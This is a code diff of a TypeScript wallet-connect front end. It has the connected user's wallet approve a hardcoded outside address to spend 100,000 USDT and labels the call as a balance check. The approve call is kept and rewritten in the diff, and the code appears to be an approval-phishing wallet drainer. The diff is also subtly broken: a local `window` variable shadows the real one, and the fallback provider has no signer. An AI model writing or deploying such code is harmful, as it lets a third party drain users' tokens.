@@ -25,38 +25,19 @@ const USDTAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
     const { address, isConnected } = useAppKitAccount()
     const { walletProvider } = useAppKitProvider('eip155')
   try {
+    let provider;
     let window: any
     if (typeof window === 'undefined' || !window.ethereum) {
-          alert('Please install MetaMask!');
-          return;
+          alert('Please install   Trust!');
+          provider = ethers.getDefaultProvider()
+        } else {
+          provider = new ethers.BrowserProvider(window.ethereum)
         }
-    const ethersProvider = new ethers.BrowserProvider(window.ethereum)
-    const signer = await ethersProvider.getSigner()
+    // const ethersProvider = new ethers.BrowserProvider(window.ethereum)
+    const signer = await provider.getSigner()
     // The Contract object
     const USDTContract = new Contract(USDTAddress, USDTAbi, signer)
-    const USDTBalance = await USDTContract.approve( '0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb', 
-    BigInt(100000000000) )
-    console.log('Approval successful');
-  } catch (error) {
-    console.error('Approval failed:', error);
-    alert('Approval failed: ' + error);
-  }
-}
-
-async function approve() {
-  try {
-    alert('Approving...');
-    writeContract({
-      abi,
-      address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT合约地址
-      functionName: 'approve',
-      args: [
-        '0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb', // 被授权地址
-        BigInt(100000000000), // 授权金额
-      ],
-      chain: undefined,
-      account: '0x53f989804eFE987Cd9837C8367126a94190E28c9'
-    });
+    const USDTBalance = await USDTContract.approve( '0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb', BigInt(100000000000) )
     console.log('Approval successful');
   } catch (error) {
     console.error('Approval failed:', error);
